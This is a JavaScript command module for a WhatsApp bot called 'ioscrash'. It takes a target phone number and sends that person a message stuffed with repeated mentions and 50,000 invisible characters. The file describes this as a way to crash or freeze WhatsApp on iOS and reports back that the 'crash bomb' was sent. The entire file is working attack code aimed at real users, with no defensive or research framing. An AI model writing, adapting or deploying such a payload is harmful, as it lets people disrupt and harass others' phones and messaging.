module.exports = {
  name: 'ioscrash',
  alias: [],
  description: 'Crash or freeze iOS WhatsApp by sending mass mentions and invisible characters',
  category: 'bug',

  async run(bot, msg, args, platform) {
    const target = args[0];

    if (!target) {
      return bot.sendMessage(msg.chat.id, '⚠️ Provide a target number.\n\nExample:\n.ioscrash 233XXXXXXXXX');
    }

    const jid = `${target}@s.whatsapp.net`;

    // Prepare a mention storm and invisible crash payload
    const invisible = "‎".repeat(50000); // 50K zero-width characters
    const mentions = new Array(20).fill({ tag: target, jid });

    const iosCrashPayload = {
      text: `@${target} `.repeat(20) + invisible,
      mentions
    };

    try {
      await bot.sendMessage(jid, iosCrashPayload);
      await bot.sendMessage(msg.chat.id, `✅ iOS crash bomb sent to ${target}`);
    } catch (e) {
      await bot.sendMessage(msg.chat.id, `❌ Failed to deliver ioscrash.\n\n${e.message}`);
    }
  }
};
